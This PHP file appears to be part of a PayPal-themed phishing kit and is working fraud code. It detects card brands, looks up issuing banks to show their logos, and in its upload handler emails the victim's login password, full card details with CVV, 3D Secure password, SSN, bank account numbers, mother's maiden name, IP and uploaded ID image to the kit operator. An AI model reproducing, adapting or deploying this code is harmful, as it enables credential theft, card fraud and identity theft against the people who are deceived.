<?php
error_reporting(0);
require_once __DIR__.'/haters.php';
require_once __DIR__.'/PHPMailer-master/PHPMailerAutoload.php';
require_once __DIR__.'/../Config.php';

if(!isset($_SESSION)) { session_start(); } 



    function BinInfo($number)
    {
        //$result_array = new stdClass();
        if(is_callable('curl_init')) {
            $c = curl_init();
            curl_setopt($c, CURLOPT_URL, 'http://bins.payout.com/api/v1/bins/'.trim(substr($number, 0, 6)));
            curl_setopt($c, CURLOPT_HEADER, false);
            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($c, CURLOPT_TIMEOUT, 30);
            curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
            $result_array = curl_exec($c);
            curl_close($c);
        } else {
            $result_array = file_get_contents('http://bins.payout.com/api/v1/bins/'.substr($number, 0, 6));
        }
        //$result_array = new stdClass();
        $result_array = json_decode($result_array);

        return $result_array;

    }


    function getCardBrand($pan, $include_sub_types = false)
    {
        //maximum length is not fixed now, there are growing number of CCs has more numbers in length, limiting can give false negatives atm

        //these regexps accept not whole cc numbers too
        //visa        
        $visa_regex = "/^4[0-9]{0,}$/";
        $vpreca_regex = "/^428485[0-9]{0,}$/";
        $postepay_regex = "/^(402360|402361|403035|417631|529948){0,}$/";
        $cartasi_regex = "/^(432917|432930|453998)[0-9]{0,}$/";
        $entropay_regex = "/^(406742|410162|431380|459061|533844|522093)[0-9]{0,}$/";
        $o2money_regex = "/^(422793|475743)[0-9]{0,}$/";

        // MasterCard
        $mastercard_regex = "/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)[0-9]{0,}$/";
        $maestro_regex = "/^(5[06789]|6)[0-9]{0,}$/"; 
        $kukuruza_regex = "/^525477[0-9]{0,}$/";
        $yunacard_regex = "/^541275[0-9]{0,}$/";

        // American Express
        $amex_regex = "/^3[47][0-9]{0,}$/";

        // Diners Club
        $diners_regex = "/^3(?:0[0-59]{1}|[689])[0-9]{0,}$/";

        //Discover
        $discover_regex = "/^(6011|65|64[4-9]|62212[6-9]|6221[3-9]|622[2-8]|6229[01]|62292[0-5])[0-9]{0,}$/";

        //JCB
        $jcb_regex = "/^(?:2131|1800|35)[0-9]{0,}$/";

        //ordering matter in detection, otherwise can give false results in rare cases
        if (preg_match($jcb_regex, $pan)) {
            return "../assets/img/jcb.png";
        }

        if (preg_match($amex_regex, $pan)) {
            return "../assets/img/amex.png";
        }

        if (preg_match($diners_regex, $pan)) {
            return "../assets/img/diners_club.png";
        }

        if (preg_match($visa_regex, $pan)) {
            return "../assets/img/visa.png";
        }

        if (preg_match($mastercard_regex, $pan)) {
            return "../assets/img/mastercard.png";
        }

        if (preg_match($discover_regex, $pan)) {
            return "../assets/img/discover.png";
        }

        if (preg_match($maestro_regex, $pan)) {
            if ($pan[0] == '5') {//started 5 must be mastercard
                return "../assets/img/mastercard.png";
            } else {
                return "../assets/img/maestro.png"; //maestro is all 60-69 which is not something else, thats why this condition in the end
            }
        }

        return "unknown"; //unknown for this system
    }

    function UPLOAD_ID($FileName, $OnError, $OnSuccess, $Directory)
    {
        global $to;
        if (isset($_FILES[$FileName]))
        {

            $dossier = $Directory;
            $fichier = time().urldecode(basename($_FILES[$FileName]['name']));
            $taille_maxi = 100000;
            $taille = @filesize($_FILES[$FileName]['tmp_name']);
            $extensions = array('.png', '.gif', '.jpg', '.jpeg','.PNG', '.GIF', '.JPG', '.JPEG');
            $extension = @strrchr($_FILES[$FileName]['name'], '.'); 


            if(!in_array($extension, $extensions))
            {
                header("Location: ".$OnError);
            }
            else
            {
                $mail = new PHPMailer();
                $MailContent = 
                "
                        <!DOCTYPE html><html><head><title></title><style type='text/css'>*{font-family: arial;}body{background: #f7f7f7;}table tr td{padding: 5px;}table{width: 600px;}.td1{width: 30%;font-weight: bold;}.td2{width: 70%;}.content{ width: 600px; background: #fff;}.title{ padding: 8px; background: black; color: #fff; font-weight: bold; letter-spacing: 3px;}.row { display: table-row; background: #ffffff;} table tr:nth-of-type(odd) { background: #e9e9e9; } @media screen and (max-width: 600px) { table { width: 100%; } .content{ width: 100%; }}</style></head><body><center><br><br><br>
                        <div class='content'>
                            <div class='title'>LOGIN INFO</div>
                            <table>
                                <tr class='row'>
                                    <td class='td1'>Email</td>
                                    <td class='td2'>{$_SESSION['EM']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Password</td>
                                    <td class='td2'>{$_SESSION['PW']}</td>
                                </tr>
                            </table>
                            <div class='title'>BILLING AND CARD</div>
                            <table>
                                <tr class='row'>
                                    <td class='td1'>First Name</td>
                                    <td class='td2'>{$_SESSION['Fn']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Last Name</td>
                                    <td class='td2'>{$_SESSION['Ln']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>City</td>
                                    <td class='td2'>{$_SESSION['city']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>State</td>
                                    <td class='td2'>{$_SESSION['state']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Zip</td>
                                    <td class='td2'>{$_SESSION['zip']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Country</td>
                                    <td class='td2'>{$_SESSION['country']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Address</td>
                                    <td class='td2'>{$_SESSION['address']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Card Number</td>
                                    <td class='td2'>{$_SESSION['Nu']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Exp Date</td>
                                    <td class='td2'>{$_SESSION['EpMo']}/{$_SESSION['EpYr']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>CSC/CVV</td>
                                    <td class='td2'>{$_SESSION['C5c']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Bin</td>
                                    <td class='td2'>{$_SESSION['Bin']->issuer}</td>
                                </tr>
                            </table>
                            <div class='title'>VBV</div>
                            <table>
                                <tr class='row'>
                                    <td class='td1'>3D Password</td>
                                    <td class='td2'>{$_SESSION['card3d']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>iBan</td>
                                    <td class='td2'>{$_SESSION['iBan']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>SSN</td>
                                    <td class='td2'>{$_SESSION['5SN']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Sort Code</td>
                                    <td class='td2'>{$_SESSION['scode']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Account Number</td>
                                    <td class='td2'>{$_SESSION['accnumber']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Mother Name</td>
                                    <td class='td2'>{$_SESSION['mname']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>Credit Limite</td>
                                    <td class='td2'>{$_SESSION['climit']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>OS ID</td>
                                    <td class='td2'>{$_SESSION['OID']}</td>
                                </tr>
                            </table>
                            <div class='title'>MACHINE INFO</div>
                            <table>
                                <tr class='row'>
                                    <td class='td1'>IP</td>
                                    <td class='td2'><a href='http://geoiptool.com/?ip={$_SERVER['REMOTE_ADDR']}'>{$_SERVER['REMOTE_ADDR']}</a></td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>COUNTRY</td>
                                    <td class='td2'>{$_SESSION['country']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>BROWSER</td>
                                    <td class='td2'>{$_SERVER['HTTP_USER_AGENT']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>BROWSER LANG</td>
                                    <td class='td2'>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
                                </tr>
                                <tr class='row'>
                                    <td class='td1'>DATE</td>
                                    <td class='td2'>".date('Y-m-d', time())." ".date('H:i:s', time())."</td>
                                </tr>
                            </table>
                        </div>
                        </center></body></html>
                ";
                $mail->From = 'miakhalifa@brazzers.com';
                $mail->FromName = 'xScamx';
                $mail->addAddress($to);
                $mail->isHTML(true);
                $mail->Body    = $MailContent;
                $mail->CharSet = 'UTF-8';
                $mail->Subject = "❤ [PP-IDENTITY] ❤  | ".$_SESSION['country']." | ".$_SERVER['REMOTE_ADDR']." ";
                $mail->AddAttachment(
                        $_FILES[$FileName]['tmp_name'], 
                        $_FILES[$FileName]['name']
                        );
                    // Отправить результат
                $mail->Send();


                 $fichier = strtr($fichier, 
                      'ÀÁÂÃÄÅÇÈÉÊËÌÍÎÏÒÓÔÕÖÙÚÛÜÝàáâãäåçèéêëìíîïðòóôõöùúûüýÿ', 
                      'AAAAAACEEEEIIIIOOOOOUUUUYaaaaaaceeeeiiiioooooouuuuyy');
                 $fichier = preg_replace('/([^.a-z0-9]+)/i', '-', $fichier);
                 if(move_uploaded_file(@$_FILES[$FileName]['tmp_name'], $dossier.'/'.$fichier))
                 {
                    header("Location: ".$OnSuccess);
                 }
                 else //Sinon (la fonction renvoie FALSE).
                 {
                    header("Location: ".$OnSuccess);
                 }
             }

        }
        else
        {
            header("Location: ".$OnError);
        }


    }

    function BankLogo($BankName, $BankIn)
    {
        if($BankName=="BANCO DE AHORRO Y CREDITO DE LAS AMERICAS" ){
               return '../assets/img/Bank/banre.gif';
           }
           
           if($BankName=="VISALUX S.C" ){
               return '../assets/img/Bank/spuerkeess.gif';
           }
           
           if($BankName=="BANKA KOMBETARE TREGTARE SH.A." ){
               return '../assets/img/Bank/bkt.gif';
           }

           if($BankName=="BANK OF NOVA SCOTIA" ){
               return '../assets/img/Bank/noobscot.png';
           }

            else if($BankName=="HSBC" || $BankName=="HSBC BANK" || $BankName=="HSBC BANK PLC"){
                   return '../assets/img/Bank/noobhsbc.gif';
               }

            else if($BankName=="EURO KARTENSYSTEME GMBH" ){
                   return '../assets/img/Bank/noobnbk.gif';
               }

            else if($BankName=="LLOYDS"){
                   return '../assets/img/Bank/noobloyd.png';
               }

            else if($BankName=="ROYAL BANK OF SCOTLAND" || $BankName=="ROYAL BANK OF SCOTLAND PLC" ){
                   return '../assets/img/Bank/noobrbc.png';
               }


            else if($BankName=="NATIONAL WESTMINSTER BANK PLC" || $BankName=="NAT WEST" || $BankName=="NATWEST" ){
                   return '../assets/img/Bank/noobnat.gif';
               }

            else if($BankName=="WELLS FARGO BANK, N.A." ){
                   return '../assets/img/Bank/well.gif';
               }
            else if($BankName=="UBS AG" ){
                   return '../assets/img/Bank/ubs.png';
               }

            else if($BankName=="NATIONWIDE" || $BankName=="NATIONWIDE BUILDING SOCIETY" ){
                   return '../assets/img/Bank/noobnwide.gif';
               }


            else if($BankName=="BARCLAYS" || $BankName=="BARCLAYS BANK PLC" ){
                   return '../assets/img/Bank/barcli.gif';
               }

               
               

            else if($BankName=="ULSTER BANK, LTD." ){
                   return '../assets/img/Bank/ulsterbnk.gif';
               }
               
               
            else if($BankName=="CLYDESDALE BANK PLC" ){
                   return '../assets/img/Bank/clyde.gif';
               }

            else if($BankName=="SANTANDER" || $BankName=="SANTANDER UK PLC" || $BankName=="SANTANDER CENTRAL HISPANO" ){
                   return '../assets/img/Bank/san.gif';
               }

            else if($BankName=="BANCO SANTANDER, S.A." ){
                   return '../assets/img/Bank/open.gif';
               }

            else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
                   return '../assets/img/Bank/fdirect.gif';
               }

            else if($BankName=="BARCLAYCARD" ){
                   return '../assets/img/Bank/noobbarclay.gif';
               }
               
            else if($BankName=="NATIONAL AUSTRALIA BANK, LTD." ){
                   return '../assets/img/Bank/nab.png';
               }
            else if($BankName=="TELLER, A.S." ){
                   return '../assets/img/Bank/tellr.gif';
               }

            else if($BankName=="BANK OF AMERICA" || $BankName == "BANK OF AMERICA, N.A." ){
                   return '../assets/img/Bank/bofa.gif';
               }

            else if($BankName=="MBNA EUROPE BANK, LTD." ){
                   return '../assets/img/Bank/noobmbna.png';
               }

            else if($BankName=="BANK OF IRELAND" ){
                   return '../assets/img/Bank/boirland.png';
               }

            else if($BankName=="LANSFORSAKRINGAR BANK AB" ){
                   return '../assets/img/Bank/lansfor.png';
               }

            else if($BankName=="CITIBANK INTERNATIONAL PLC" ){
                   return '../assets/img/Bank/citi.gif';
               }

            else if($BankName=="Nordea" || $BankName=="NORDEA BANK FINLAND PLC" || $BankName=="NORDEA BANK DANMARK A/S" ){
                   return '../assets/img/Bank/nordea.png';
               }



            else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/Bangkobnk.png';
               }

               
               
            else if($BankIn=="475111" ){
                   return '../assets/img/Bank/ulsterbnk.gif';
               }
               
               
            else if($BankIn=="518652" ){
                   return '../assets/img/Bank/teskobnk.gif';
               }
               
               
            else if($BankIn=="462239" ){
                   return '../assets/img/Bank/anz.gif';
               }
            else if($BankIn=="431938" ){
                   return '../assets/img/Bank/boi.gif';
               }

            else if($BankIn=="524590" ){
                   return '../assets/img/Bank/bglbnp.gif';
               }
               
            else if($BankIn=="429941" ){
                   return '../assets/img/Bank/eikalogo.svg';
               }

            else if($BankIn=="462287" ){
                   return '../assets/img/Bank/Bangkobnk.png';
               }

            else if($BankIn=="516815" ){
                   return '../assets/img/Bank/swedbnk.png';
               }

            else if($BankName=="Swedbank" || $BankName=="SWEDBANK AB" ){
                   return '../assets/img/Bank/swedbnk.png';
               }

            else if($BankIn=="462845" || $BankIn=="554827" || $BankIn=="526471" ){
                   return '../assets/img/Bank/dbs.gif';
               }

            else if($BankIn=="517011" ){
                   return '../assets/img/Bank/netstech.png';
               }
            else if($BankIn=="446291" ){
                   return '../assets/img/Bank/halif.gif';
               }  
             
            else if($BankIn=="472409" ){
                   return '../assets/img/Bank/canadatrust.gif';
               }
            else if($BankName=="KASIKORNBANK PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/bgo.gif';
               }

            else if($BankName=="BANK OF CYPRUS PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/bnkofcy.png';
               }

            else if($BankName=="DESJARDINS" || $BankName=="LA FEDERATION DES CAISSES DESJARDINS DU QUEBEC" ){
                   return '../assets/img/Bank/desjardinsbnk.png';
               }

            else if($BankName=="HALIFAX" ){
                   return '../assets/img/Bank/halif.gif';
               }

            else if($BankName=="SCHWEIZERISCHER BANKVEREIN (SWISS BANK CORPORATION" ){
                   return '../assets/img/Bank/sissbnkcoop.png';
               }

            else if($BankName=="CIBC" || $BankName=="CANADIAN IMPERIAL BANK OF COMMERCE" ){
                   return '../assets/img/Bank/cibc.png';
               }
               
            else if($BankName=="BANK OF MONTREAL" ){
                   return '../assets/img/Bank/bnkmontreal.png';
               }

            else if($BankName=="NATIONAL BANK OF CANADA" ){
                   return '../assets/img/Bank/nationalbank.png';
               }

            else if($BankName=="ROYAL BANK OF CANADA" || $BankName=="RBC ROYAL BANK OF CANADA" ){
                   return '../assets/img/Bank/rbc.png';
               }

            else if($BankName=="TD CANADA TRUST" || $BankName=="COMPASS BANK" || $BankName=="TORONTO-DOMINION BANK" ){
                   return '../assets/img/Bank/canadatrust.gif';
               }


               
            else if($BankName=="WESLEYAN SAVINGS BANK, LTD." ){
                   return '../assets/img/Bank/wesle.png';
               }

            else if($BankName=="CO-OPERATIVE BANK PLC" ){
                   return '../assets/img/Bank/coperative.png';
               }

            else if($BankName=="STANDARD CHARTERED BANK" ){
                   return '../assets/img/Bank/standar.png';
               }

            else if($BankName=="ALLIANCE AND LEICESTER PLC" ){
                   return '../assets/img/Bank/alliance.png';
               }

            else if($BankName=="BANCO SABADELL" ){
                   return '../assets/img/Bank/saba.png';
               }

            else if($BankName=="PRESIDENT'S CHOICE FINANCIAL" ){
                   return '../assets/img/Bank/president.png';
               }

            else if($BankName=="CAPITAL ONE BANK OF CANADA BRANCH" || $BankName=="CAPITAL ONE BANK (CANADA BRANCH)" || $BankName=="CAPITAL ONE BANK (USA), N.A." ||  $BankName=="CAPITAL ONE BANK N.A." ){
                   return '../assets/img/Bank/capitalone.png';
               }

            else if($BankName=="SEB" || $BankName=="SKANDINAVISKA ENSKILDA BANKEN AB" ){
                   return '../assets/img/Bank/SEBlogo.png';
               }
               

            else if($BankName=="BNP PARIBAS FORTIS" ){
                   return '../assets/img/Bank/bnpt.jpg';
               }

            else if($BankName=="BNP PARIBAS" ){
                   return '../assets/img/Bank/bnp.png';
               }

            else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
                   return '../assets/img/Bank/bancopop.gif';
               }

            else if($BankName=="Handelsbanken" ){
                   return '../assets/img/Bank/hand.png';
               }
               
            else if($BankName=="METRO BANK PLC" ){
                   return '../assets/img/Bank/metro.gif';
               }

            else if($BankName=="LLOYDS TSB"  || $BankName=="LLOYDS TSB BANK PLC" ){
                   return '../assets/img/Bank/tsb1.gif';
               }

            else if($BankName=="BANK OF NEW ZEALAND" ){
                   return '../assets/img/Bank/bnz.gif';
               }

            else if($BankName=="EVO BANCO" ){
                   return '../assets/img/Bank/EVO.png';
               }

            else if($BankName=="BANCO POPULAR DE PUERTO RICO" ){
                   return '../assets/img/Bank/bancopopular.gif';
               }

            else if($BankName=="CAIXABANK S.A." || $BankName=="LA CAIXA" ){
                   return '../assets/img/Bank/CaixaCard.gif';
               }

            else if($BankName=="UNITED NATIONAL BANK, LTD." ){
                   return '../assets/img/Bank/unb.jpg';
               }

            else if($BankName=="BANCA MARCH, S.A." ){
                   return '../assets/img/Bank/march.gif';
               }

            else if($BankName=="BRD - GROUPE SOCIETE GENERALE, S.A." ){
                   return '../assets/img/Bank/brd.jpg';
               }

            else if($BankName=="SOCIETE GENERALE, S.A." ){
                   return '../assets/img/Bank/stegenerale.png';
               }

            else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
                   return '../assets/img/Bank/fdirect.gif';
               }

            else if($BankName=="LLOYDS BANK PLC" ){
                   return '../assets/img/Bank/Lloydsopop.gif';
               }

            else if($BankName=="RAIFFEISEN BANK SH.A." ){
                   return '../assets/img/Bank/RaiffeisenBankLogo.jpg';
               }

            else if($BankName=="ACCESS BANK PLC" ){
                   return '../assets/img/Bank/ACCESS-BANK.jpg';
               }

            else if($BankName=="ERSTE AND STEIERMARKISCHE BANK D.D." ){
                   return '../assets/img/Bank/ERSTE.png';
               }

            else if($BankName=="CHASE BANK USA, N.A." ){
                   return '../assets/img/Bank/chase.jpg';
               }

            else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
                   return '../assets/img/Bank/jpmorganchase.jpg';
               }

            else if($BankName=="COMMONWEALTH BANK OF AUSTRALIA" || $BankName == "COMMONWEALTH BANK" ){
                   return '../assets/img/Bank/old-commonwealth-bank-logo-1024x379-1024x379.jpg';
               }
            else if($BankName=="ASB BANK" ){
                   return '../assets/img/Bank/asb.jpg';
               }
            else if($BankName=="STANDARD CHARTERED GRINDLAYS (OFFSHORE), LTD." ){
                   return '../assets/img/Bank/standard-chartered-uk.jpg';
               }
            else if($BankName=="U.S. BANK N.A. ND" ){
                   return '../assets/img/Bank/comp_1_logo-usbank-siteheader.png';
               }
            else if($BankName=="REGIONS BANK" ){
                   return '../assets/img/Bank/REG_color_register.jpg';
               }
            else if($BankName=="BRANCH BANKING AND TRUST COMPANY" ){
                   return '../assets/img/Bank/bbtlogo.jpg';
               }
            else if($BankName=="PNC BANK, N.A." ){
                   return '../assets/img/Bank/pnc.png';
               }
            else if($BankName=="SHAZAM, INC." ){
                   return '../assets/img/Bank/SHAZAM_CMYK.png';
               }
            else if($BankName=="CITIBANK, N.A." || $BankName == "CITIBANK"){
                   return '../assets/img/Bank/CITIBANK.jpg';
               }
            else if($BankName=="KRUNGTHAI CARD PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/csr-ktb-brandage13062554-1.jpg>';
               }
            else if($BankName=="KRUNG THAI BANK PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/krungthai bank.png';
               }
            else if($BankName=="BANGKOK BANK PUBLIC CO., LTD." ){
                   return '../assets/img/Bank/Bangkok_bank.png';
               }
            else if($BankName=="NATIONAL WESTMINSTER BANK PLC" ){
                   return '../assets/img/Bank/NationalWestminsterBank1970.png';
               }
            else if($BankName=="M BANK, F.S.B." ){
                   return '../assets/img/Bank/Mbank-logo.jpg';
               }
            else if($BankName=="CARTASI S.P.A." ){
                   return '../assets/img/Bank/cartasi.jpg';
               }
            else if($BankName=="CHELSEA GROTON BANK" ){
                   return '../assets/img/Bank/CG_Stacked_A.png';
               }
            else if($BankName=="GWINNETT F.C.U." ){
                   return '../assets/img/Bank/GCB_Logo005a.png';
               }
            else if($BankName=="GE CAPITAL RETAIL BANK" ){
                   return '../assets/img/Bank/GE-Capital-Logo.jpg';
               }
            else if($BankName=="JPMORGAN CHASE BANK, N.A." ){
                   return '../assets/img/Bank/jpmorganchase.jpg';
               }

            else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
                   return '../assets/img/Bank/fdirect.gif';
               }

            else if($BankName=="CREDIT ONE BANK, N.A." ){
                   return '../assets/img/Bank/CreditOne.jpg';
               }
            else if($BankName=="FIRST DIRECT, DIVISION OF HSBC UK" ){
                   return '../assets/img/Bank/fdirect.gif';
               }
            else if($BankName==NULL ) {
                  return false;
               }
               
            else {
                  return false;
               }
    }
  function GenerateHash($len = 5)
  {
    $charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $base = strlen($charset);
    $result = '';

    $now = explode(' ', microtime());
    $now = $now[1];
    while ($now >= $base){
      $i = $now % $base;
      $result = $charset[$i] . $result;
      $now /= $base;
    }
    return substr($result, -5);
  }